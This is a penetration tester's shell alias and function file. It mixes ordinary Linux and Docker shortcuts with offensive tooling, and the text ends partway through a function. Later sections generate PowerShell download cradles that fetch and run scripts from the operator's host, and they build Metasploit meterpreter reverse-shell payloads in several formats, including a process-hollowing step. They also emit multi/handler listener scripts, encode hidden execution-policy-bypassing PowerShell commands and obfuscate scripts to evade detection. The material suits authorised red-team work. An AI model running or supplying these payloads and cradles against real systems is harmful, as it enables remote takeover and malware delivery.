BOLD="\033[01;01m"
YELLOW='\033[0;33m'
NC='\033[0m'

# BASIC OS Commands
alias ll="ls -l"
alias la="ls -la"
alias lla='find "$(pwd)" -type f'
alias chmod='chmod -c'
alias rw-='chmod 600'
alias rwx='chmod 700'
alias r--='chmod 644'
alias r-x='chmod 755'

command -v lsd &> /dev/null && alias ls='lsd --group-dirs first -l'
command -v htop &> /dev/null && alias top='htop'

alias mirror='wget -mkEpnp -e robots=off'
alias unblock_dir='sudo chmod -R 755'
alias block_dir='sudo chmod -R 700'

## grep aliases
alias grep="grep --color=never"
alias ngrep="grep -n"
alias egrep="egrep --color=auto"
alias fgrep="fgrep --color=auto"

## screen
alias screen="screen -xRR"

## Checksums
alias sha1="openssl sha1"
alias md5="openssl md5"

## Force create folders
alias mkdir="/bin/mkdir -pv"

## DNS - External IP #1
alias dns1="dig +short @resolver1.opendns.com myip.opendns.com"

## DNS - External IP #2
alias dns2="dig +short @208.67.222.222 myip.opendns.com"

### DNS - Check ("#.abc" is Okay)
alias dns3="dig +short @208.67.220.220 which.opendns.com txt"

## Directory navigation aliases
alias ..="cd .."
alias ...="cd ../.."
alias ....="cd ../../.."
alias .....="cd ../../../.."

## strings
alias strings="strings -a"

## history
alias hg="history | grep"

## aircrack-ng
alias aircrack-ng="aircrack-ng -z"

## airodump-ng 
alias airodump-ng="airodump-ng --manufacturer --wps --uptime"

## rdesktop
alias rdesktop="rdesktop -z -P -g 90% -r disk:local=\"/tmp/\""

## grc diff alias
alias diff='/usr/bin/grc /usr/bin/diff'

## grc dig alias
alias dig='/usr/bin/grc /usr/bin/dig'

## grc gcc alias
alias gcc='/usr/bin/grc /usr/bin/gcc'

## grc ifconfig alias
alias ifconfig='sudo /usr/bin/grc /usr/sbin/ifconfig'

## grc mount alias
alias mount='/usr/bin/grc /usr/bin/mount'

## grc netstat alias
alias netstat='/usr/bin/grc /usr/bin/netstat'

## grc ping alias
alias ping='/usr/bin/grc /usr/bin/ping'

## grc ps alias
alias ps='/usr/bin/grc /usr/bin/ps'

## grc tail alias
alias tail='/usr/bin/grc /usr/bin/tail'

## grc traceroute alias
alias traceroute='/usr/bin/grc /usr/sbin/traceroute'

## grc wdiff alias
alias wdiff='/usr/bin/grc /usr/bin/wdiff'

alias history='omz_history -f'

alias nmap="sudo nmap"

###############
# HELPER
###############
echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - OS HELPER - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

## List open ports
echo "ports - netstats open tcp ports"
alias ports="sudo netstat -tulanp"

## Get external IP address
echo "exip - shows external ip"
alias exip="curl -s http://ipinfo.io/ip"

#copy output to clipboard
echo "pbcopy - used with a pipe, puts stdout of a command to clipboard - cat report.txt | pbcopy"
alias pbcopy='xclip -selection clipboard'
alias pbpaste='xclip -selection clipboard -a "x64" -o'

## Unzip & untar
echo "unzip - uses 7z to unzip a file - unzip <filename.zip>"
alias unzip="7z x "
alias untar="tar -xvf "

echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - DOCKER - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

alias dcls="sudo docker container ls -a"
alias dcrm="sudo docker container rm"
alias dils="sudo docker images"
alias dirm="sudo docker image rm"

echo "dockershell - spawns dockershell for a container in it's current working directory - dockershellhere <containername>"
alias dockershell="sudo docker run --rm -i -t --entrypoint=/bin/bash"

echo "dockershellsh - spawns a sh dockershell for a container in it's current working directory dockershellsh <containername>"
alias dockershellsh="sudo docker run --rm -i -t --entrypoint=/bin/sh"

echo "dockershellhere - spawns dockershell for a container and includes the current directory - dockershellhere <containername>"
function dockershellhere() {
    dirname=${PWD##*/}
    sudo docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/${dirname} -w /${dirname} "$@"
}

echo "dockershellshhere - spawns dockershell for a container and includes the current directory - dockershellshhere <containername>"
function dockershellshhere() {
    dirname=${PWD##*/}
    sudo docker run --rm -it --entrypoint=/bin/sh -v `pwd`:/${dirname} -w /${dirname} "$@"
}

echo "autocompose - automatically create a docker compose file from a running container - autocompose <containername>"
alias autocompose='sudo docker run --rm -v /var/run/docker.sock:/var/run/docker.sock ghcr.io/red5d/docker-autocompose'


echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - SERVICES - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"


echo "nginxsslcert - creates a self-signed SSL cert for nginx - nginx has to be restarted to apply changes"
function nginxsslcert () {
        SSL_LOCATION="/opt/ssl" 
        echo -n "Coutry [US]: "
        read CERT_COUNTRY
        [ -z "$CERT_COUNTRY" ] && CERT_COUNTRY="US" 
        echo -n "State [WA]: "
        read CERT_STATE
        [ -z "$CERT_STATE" ] && CERT_STATE="WA" 
        echo -n "Location [Seattle]: "
        read CERT_LOCATION
        [ -z "$CERT_LOCATION" ] && CERT_STATE="WA" 
        echo -n "Organization: [Microsoft Corporation]: "
        read CERT_ORGANIZATION
        [ -z "$CERT_ORGANIZATION" ] && CERT_ORGANIZATION="Microsoft Corporation" 
        echo -n "Organizational Unit [Microsoft Corporation]: "
        read CERT_OU
        [ -z "$CERT_OU" ] && CERT_OU="Microsoft Corporation" 
        echo -n "Common Name (CN) [www.microsoft.com]: "
        read CERT_CN
        [ -z "$CERT_CN" ] && CERT_CN="www.microsoft.com" 
        sudo mkdir -pv $SSL_LOCATION
        sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout "$SSL_LOCATION/server.key" -out "$SSL_LOCATION/server.crt" -subj "/C=$CERT_COUNTRY/ST=$CERT_STATE/L=$CERT_LOCATION/O=$CERT_ORGANIZATION/OU=$CERT_OU/CN=$CERT_CN"
        sudo cat $SSL_LOCATION/server.key $SSL_LOCATION/server.crt | sudo tee $SSL_LOCATION/server.pem
        echo "\n\nSSL Certificate and Key have been saved to: $SSL_LOCATION"
        echo ""
        echo ""
}


echo "nginxhere - spawns nginx http server in current dir - nginxhere <HTTP-PORT> <HTTPS-PORT> <IFACE>"
function nginxhere() {


        PORT_HTTP=$1
        PORT_HTTPS=$2
        ATTACK_INTERFACE=$3
        IPV4="$(ip -a -o -4 addr list $ATTACK_INTERFACE | awk '{print $4}' | cut -d/ -f1)"
        NGINX_CONTAINER_NAME='nginx'
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [ $# -eq 3 ];then
                FILE="/opt/ssl/server.crt"
                if test -f "$FILE"; then
                    echo "$FILE Certificate exists ... continuing ..."
                    sudo docker run -d --rm -it -p "$PORT_HTTP:80" -p "$PORT_HTTPS:443" --name "$NGINX_CONTAINER_NAME" -v "/opt/ssl/server.key:/etc/nginx/ssl/server.key" -v "/opt/ssl/server.crt:/etc/nginx/ssl/server.crt" -v "${PWD}:/srv/data" miguel1337/nginxhere:latest    
                else
                    echo "$FILE Certificate does not exist exists ... generating cert ..."
                    nginxsslcert
                    sudo docker run -d --rm -it -p "$PORT_HTTP:80" -p "$PORT_HTTPS:443" --name "$NGINX_CONTAINER_NAME" -v "/opt/ssl/server.key:/etc/nginx/ssl/server.key" -v "/opt/ssl/server.crt:/etc/nginx/ssl/server.crt" -v "${PWD}:/srv/data" miguel1337/nginxhere:latest
                fi
                
                echo "You can access the nginxwebserver via the following url: "
                echo "http://$IPV4:$PORT_HTTP"
                echo "https://$IPV4:$PORT_HTTPS\n"
  
                echo "If you wish to stop the container run:"
                echo "nginxstop\n"

                echo "If you wish to stop the container run: "
                echo "nginxpurge\n\n"


                echo "Generating a file with PowerShell Download cradles"
                # iexurls $IPV4 $PORT_HTTP | tee iex-cradles.txt
                echo "use pscradles - to get the cradles\n"

                sudo docker attach nginx
        else
                echo -e "${RED}Please enter the HTTP-PORT and HTTPS port as argument: nginxhere 80 443 tun0${NC}"
        fi
}


echo -e "iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <INTERFACE> <PORT> [<DIR_PATH>]"
iexurls () {
  RED='\033[0;31m'
  NC='\033[0m'

  # Default values
  DEFAULT_PORT="8080"
  DEFAULT_DIR="."

  if [ $# -eq 2 ]; then
    INTERFACE=$1
    PORT=$2
    DIR_PATH=$DEFAULT_DIR
  elif [ $# -eq 3 ]; then
    INTERFACE=$1
    PORT=$2
    DIR_PATH=$3
  else
    echo -e "${RED}iexurls - usage: iexurls <INTERFACE> <PORT> [<DIR_PATH>]${NC}"
    return 1
  fi

  # Extract the IP address of the given interface
  IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d'/' -f1)

  if [ -z "$IP" ]; then
    echo -e "${RED}No IP found for interface $INTERFACE. Please check the interface name.${NC}"
    return 1
  fi

  echo "Using IP: $IP (from interface $INTERFACE)"

  # Find and process .ps1 files
  find $DIR_PATH -name "*.ps1" | while read SCRIPT_PATH; do
    RELATIVE_PATH=$(realpath --relative-to="$DIR_PATH" "$SCRIPT_PATH")
    DOWNLOAD_CRADLE="iex((New-Object net.webclient).DownloadString('http://$IP:$PORT/$RELATIVE_PATH'))" 
    echo $DOWNLOAD_CRADLE
    echo
  done
}


echo -e "psdownloadcradles - recursively looks for extension file and generates PowerShell download cradles for these - psdownloadcradles <IP> <PORT> <EXTENSION> <DIR_PATH>"
function psdownloadcradles(){
    RED='\033[0;31m'
    NC='\033[0m' # No Color

    if [ $# -eq 4 ]; then
        INTERFACE=$1
        PORT=$2
        EXTENSION=$3
        DIR_PATH=$4

        # Extract the IP address from the interface
        IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d'/' -f1)

        if [ -z "$IP" ]; then
            echo -e "${RED}No IP found for interface $INTERFACE. Please check the interface name.${NC}"
            return 1
        fi

        echo "Using IP: $IP (from interface $INTERFACE)"

        # Find files and generate download cradles
        find $DIR_PATH -name "*.$EXTENSION" | while read SCRIPT_PATH; do
            # Extract the filename
            FILENAME=$(basename "$SCRIPT_PATH")
            # Get the relative path of the script
            RELATIVE_PATH=$(realpath --relative-to="$DIR_PATH" "$SCRIPT_PATH")
            # Build the download cradle
            DOWNLOAD_CRADLE="(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$RELATIVE_PATH','C:/Users/Public/$FILENAME')"
            # Output the download cradle
            echo $DOWNLOAD_CRADLE
            echo
        done
    else
        echo -e "${RED}psdownloadcradles - recursively looks for files with the specified extension and generates PowerShell download cradles.${NC}"
        echo -e "${RED}Usage: psdownloadcradles <INTERFACE> <PORT> <EXTENSION> <DIR_PATH>${NC}"
    fi
}

alias iexurlsgrep="iexurls | grep --color=never"

alias nginxstop="sudo docker container stop nginx"
alias nginxpurge="sudo docker container stop nginx && sudo docker image rm miguel1337/nginxhere"

echo "smbservehere - spawns smb server in current dir"
smbservehere() {
    local sharename
    [[ -z $1 ]] && sharename="SHARE" || sharename=$1
    sudo docker run --rm -it -p 445:445 -v "${PWD}:/tmp/serve" rflathers/impacket smbserver.py -smb2support $sharename /tmp/serve
}

echo "webdavhere - spawns webdav server in current dir"
alias webdavhere='sudo docker run --rm -it -p 80:80 -v "${PWD}:/srv/data/share" rflathers/webdav'

## ssh-start
echo "ssh-start - start OS SSH service"
alias ssh-start="sudo systemctl restart ssh"
echo "ssh-stop - stop OS SSH service"
alias ssh-stop="sudo systemctl stop ssh"

## samba
echo "smb-start - start OS SSH service"
alias smb-start="sudo systemctl restart smbd nmbd"
echo "smb-stop - stop OS SSH service"
alias smb-stop="sudo systemctl stop smbd nmbd"



echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - INFRA PENTEST - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

echo "getports - returns ports of a nmap scan - getports <nmapfile.nmap>"
function getports() {
        # extracts all ports from an nmap scan file as one-line
        # to be used as -sS -Pn -sV -sC -a "x64" -o -p <oneliner>
        nmap_file=$1
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [[ "$nmap_file" == *".nmap"* ]];then
                ports=$(cat $1 | grep " open " | grep -e tcp -e udp | cut -d"/" -f1 | sort | uniq | tr "\n" "," | sed 's/.$//')
                echo $ports && echo
        else
                echo -e "${RED}Only .NMAP format supported! Exiting..${NC}"
        fi
}

echo "startnessus - Starts nessus on TCP/8834 - startnessus <ACTIVATION-CODE>"
function startnessus() {
        USER="nessus"
        ACTIVATION_CODE=$1
        PORT='8834'
        echo -n "Password: "
        read -s PASS
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [ $# -eq 1 ];then
                sudo docker run -d --name nessus-docker -p 8834:8834  -e ACTIVATION_CODE="$ACTIVATION_CODE" -e USERNAME="$USER" -e PASSWORD="$PASS" tenableofficial/nessus
                echo "you can access nessus on port via the following url: https://localhost:$PORT"
                echo "Username: $USER"
                echo "Password: $PASS"
        else
                echo -e "${RED}Only please enter a Nessus Activation code as argument ... startnessus <ACTIVATION-CODE>${NC}"
        fi
}

echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - OSINT - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

echo "sudomy - Subdomain Enumeration & Analysis; sudomy <domain>; runs sudomy docker container with --all flag and no nmap/gobuster; results in 'output' dir"
alias sudomy='cd /opt/tools/osint/sudomy && docker run -v "/opt/tools/osint/sudomy/output:/usr/lib/sudomy/output" -v "/opt/tools/osint/sudomy/sudomy.api:/usr/lib/sudomy/sudomy.api" -it --rm screetsec/sudomy:v1.2.0-dev -a -d'

echo "purednsburte - DNS bruteforce - purednsbrute <wordlist> <domain>"
alias purednsbrute='puredns bruteforce -r /opt/tools/osint/dnsvalidator/resolvers.txt'

echo "dnsvalidator - update dnsvalidators"
alias dnsvalidator="sudo docker run -v /opt/tools/osint/dnsvalidator:/dnsvalidator/output -t dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o /dnsvalidator/output/resolvers.txt"

echo "xingdumper -u <xing-company-url> - extracts XING employees as CSV"
alias xingdumper="python3 /opt/tools/osint/XingDumper/xingdumper.py"


echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - WEB - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

echo "shcheck - Security Header Check; shcheck <url> + <args>"
alias shcheck='sudo docker run --rm -it --name shcheck miguel1337/shcheck:latest'

echo "jsEndpoints - find endpoints in JavaScript file - jsEndpoints <url to js>"
function jsEndpoints() {
        URL=$1
        if [ $# -eq 1 ];then
                curl -Lks $URL | tac | sed "s#\\\/#\/#g" | egrep -a "x64" -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=$URL '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
        else
                echo -e "${RED}Please enter an URL as argument ... jsEndpoints <url to js>${NC}"
        fi
   
}
# https://gist.github.com/gwen001/0b15714d964d99c740a7e8998bd483df

echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - METASPLOIT - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"
echo "msfgenpayloads - Generate different msfpayloads - msfgenpayloads <INTERFACE> <HTTPS_PORT> <TCP_PORT>"
function msfgenpayloads(){


        if [ $# -eq 3 ];then
                INTERFACE=$1
                IPV4="$(ip -a -o -4 addr list $INTERFACE | awk '{print $4}' | cut -d/ -f1)"
                HTTPS_PORT=$2
                TCP_PORT=$3

                echo "Generating meterpreter payloads..."


                echo "\n${YELLOW}${BOLD}Generating meterpreter RAW${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"


                echo "\n${YELLOW}${BOLD}Generating meterpreter C#${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.csharp"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"


                echo "\n${YELLOW}${BOLD}Generating meterpreter Powershell${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f ps1 -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.ps1"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "ps1" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.ps1"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f ps1 -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.ps1"                
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "ps1" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.ps1"

                
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f powershell -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.powershell"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "powershell" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.powershell"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f powershell -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.powershell"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "powershell" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.powershell"
                
                echo "\n${YELLOW}${BOLD}Generating meterpreter VBA${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vba"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "vba" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vba"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vba"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "powershell" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.powershell"


                echo "\n${YELLOW}${BOLD}Generating meterpreter vbscript${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f vbscript -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vbscript"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "vbscript" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vbscript"
                echo ""
                echo "\n${YELLOW}${BOLD}Generating meterpreter vba${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vbscript"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "vba" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vba"

                python "/home/$USER/OSEP/payloads/powerhollow.py" "$IPV4" "$TCP_PORT" 'c:\windows\system32\svchost.exe' 'explorer ps' -out "/home/$USER/OSEP/payloads/meterpreter_x64_reverse_tcp_hollow.txt" -p 'windows/x64/meterpreter/reverse_tcp'

                echo "\n${YELLOW}${BOLD}Payloads have been generated successfully. Bye${NC}"

        else
                echo -e "${RED}Please the interface and port you want to listen - msfgenpayloads msfgenpayloads <INTERFACE> <HTTPS_PORT> <TCP_PORT>${NC}"
        fi   
}


echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - Metasploit - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"
echo "resourcescript - Start metasploit with dynamic settings - resourcescript <INTERFACE> <HTTPS_PORT_WIN> <TCP_PORT_WIN> <HTTPS_PORT_LINUX> <TCP_PORT_LINUX>"
function resourcescript(){
        CURR_PWD=`pwd`
        if [ $# -eq 5 ];then
                INTERFACE=$1
                IPV4="$(ip -a -o -4 addr list $INTERFACE | awk '{print $4}' | cut -d/ -f1)"
                HTTPS_PORT=$2
                TCP_PORT=$3
                HTTPS_PORT_LINUX=$4
                TCP_PORT_LINUX=$5
                
                echo "db_connect -y /usr/share/metasploit-framework/config/database.yml"
                echo -n "Workspace: "
                read WORKSPACE
                mkdir -pv logs

                echo "Metasploit resource script"
                echo "============================================================================================================================================"
                echo "spool logs/metasploit.log"
                echo "date"
                
                echo "workspace -a $WORKSPACE"
                echo "workspace $WORKSPACE"
                echo "use exploit/multi/handler"
                echo "setg payload windows/x64/meterpreter/reverse_tcp"
                echo "setg LHOST $INTERFACE" 
                echo "setg lport $TCP_PORT"
                echo "setg ExitOnSession false"
                echo "options"
                echo "exploit -j -z"
                echo "use exploit/multi/handler"
                echo "setg payload windows/x64/meterpreter/reverse_https"
                echo "setg LHOST $INTERFACE"
                echo "setg lport $HTTPS_PORT"
                echo "setg ExitOnSession false"
                echo "set HandlerSSLCert /opt/ssl/server.pem"
                echo "setg HttpUserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.44'"
                echo "setg StagerVerifySSLCert true"
                echo "options"
                echo "exploit -j -z"
                echo "set payload linux/x64/meterpreter_reverse_https"
                echo "set LHOST $INTERFACE"
                echo "setg lport $HTTPS_PORT_LINUX"
                echo "set ExitOnSession false"
                echo "set HandlerSSLCert /opt/ssl/server.pem"
                echo "setg HttpUserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.44'"
                echo "set StagerVerifySSLCert true"
                echo "options"
                echo "exploit -j -z"
                echo "use exploit/multi/handler"
                echo "set payload linux/x64/meterpreter/reverse_tcp"
                echo "set LHOST $INTERFACE"
                echo "set lport $TCP_PORT_LINUX"
                echo "set ExitOnSession false"
                echo "options"
                echo "exploit -j -z"
                echo "use auxiliary/server/socks_proxy"
                echo "set SRVHOST 0.0.0.0"
                echo "set SRVPORT 1084"
                echo "options"
                echo "exploit -j -z"
                echo 'hosts -C "address,name,service_count,comments"'
                echo "services"
                echo "creds"
                echo "============================================================================================================================================"
                echo " "
        else
                echo -e "${RED}Please the interface and port you want to listen - metasploitstart <INTERFACE> <HTTPS_PORT_WIN> <TCP_PORT_WIN> <HTTPS_PORT_LINUX> <TCP_PORT_LINUX>${NC}"
        fi
}


echo "neo4jhere - Start neo4j and save data in current directory - neo4jhere <PROJECT_NAME>"
function neo4jhere(){
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [ $# -eq 1 ];then
                PROJECT_NAME=$1
                echo -n "Password: "
                read -s PASS
                sudo docker run --name "neo4j-$PROJECT_NAME" -p 7474:7474 -p 7687:7687 -d -v "${PWD}/neo4j/data:/data" -v "${PWD}/neo4j/logs:/logs" -v "${PWD}/neo4j/import:/var/lib/neo4j/import" -v "${PWD}/neo4j/plugins:/plugins" --env "NEO4J_AUTH=neo4j/$PASS" neo4j:4.4-community
                echo "you can access neo4j under the following:"
                echo "neo4j web service - http://localhost:7474"
                echo "neo4j bolt - bolt://localhost:7687"
                echo "Username: neo4j"
                echo "Password: $PASS\n"
                echo "The docker container is running under the name neo4j_$PROJECT_NAME"
        else
                echo -e "${RED}Please enter a project name as argument ... neo4jhere <PROJECT_NAME>${NC}"
        fi
}


echo "psencodecmd - encoding a single command - psencodecmd"
function psencodecmd(){
        RED='\033[0;31m'
        NC='\033[0m' # No Color


        if [ $# -eq 0 ];then
                echo -n "PowerShell Command: "
                read PS_COMMAND
                echo ""
                echo -n "cmd.exe /c powershell -ep bypass -windowstyle hidden -enc "
                echo -n "$PS_COMMAND" | iconv --to-code UTF-16LE | base64 -w 0
                echo ""
                echo -n "$PS_COMMAND" | iconv --to-code UTF-16LE | base64 -w 0 | pbcopy

                echo "Encded command has been copies to your clipboard"
        elif [[ $# -eq 1 ]]; then
                PS_COMMAND=$1
                echo ""
                echo -n "cmd.exe /c powershell -ep bypass -windowstyle hidden -enc "
                echo -n "$PS_COMMAND" | iconv --to-code UTF-16LE | base64 -w 0
                echo ""
                echo -n "$PS_COMMAND" | iconv --to-code UTF-16LE | base64 -w 0 | pbcopy
                echo "Encded command has been copies to your clipboard"
        else
                echo -e "${RED}Usage: psencodecmd${NC}"
                echo -e "${RED}Usage: psencodecmd <CMD>${NC}"
        fi

}

echo "psobfuscatecmd - obfuscating a single command - psobfuscatecmd"
function psobfuscatecmd(){
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [ $# -eq 0 ];then
                echo -n "PowerShell Command: "
                read PS_COMMAND
                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptBlock {$PS_COMMAND} -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"
        elif [[ $# -eq 1 ]]; then
                PS_COMMAND=$1
                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptBlock {$PS_COMMAND} -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"
        else
                echo -e "${RED}Usage: psobfuscatecmd${NC}"
                echo -e "${RED}Usage: psobfuscatecmd <CMD>${NC}"
        fi
}

echo "psobfuscatescript - obfuscating a script - psobfuscatescript <SCRIPT_PATH.ps1>"
function psobfuscatescript(){
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [ $# -eq 1 ];then
                SCRIPT_PATH=$1
                echo -n "Obfuscating PowerShell Script: $SCRIPT_PATH"
                pwsh -c "Import-Module /opt/tools/ad/Invoke-Obfuscation\Invoke-Obfuscation.psd1;Invoke-Obfuscation -ScriptPath "$SCRIPT_PATH" -Command 'TOKEN,ALL,1,BACK,BACK,ENCODING,6,BACK,COMPRESS,1,BACK,LAUNCHER,1,3,4,7' -Quiet"  | tee $SCRIPT_PATH.obfs.txt
        else
                echo -e "${RED}psobfuscatescript <SCRIPT.ps1>${NC}"
        fi
}

echo "psobfuscaterecursively - obfuscating all ps1 script within a path - psobfuscaterecursively <PATH>"
function psobfuscaterecursively(){
